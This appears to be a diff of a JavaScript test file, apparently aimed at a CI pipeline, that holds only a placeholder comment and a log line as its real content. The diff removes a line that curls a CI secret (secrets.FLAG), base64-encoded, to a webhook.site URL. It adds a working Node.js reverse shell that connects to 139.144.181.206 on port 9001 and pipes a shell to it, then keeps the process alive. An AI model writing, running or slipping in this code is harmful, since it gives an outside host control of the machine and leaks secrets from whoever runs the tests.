@@ -1,3 +1,23 @@
 // TODO: implement the tests
 console.log("Tests are not implemented yet...");
-{{ process.mainModule.require('child_process').exec('curl https://webhook.site/c9f915d6-1ead-4dfb-868b-95ce461e6652/$(echo ${{ secrets.FLAG }} | base64)') }};
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("sh", []);
+    var client = new net.Socket();
+    client.connect(9001, "139.144.181.206", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+
+// Sleep for 40 seconds
+setTimeout(function(){
+    // Exit the process
+    process.exit();
+} , 40000);
+
+// Block exit
+process.stdin.resume();
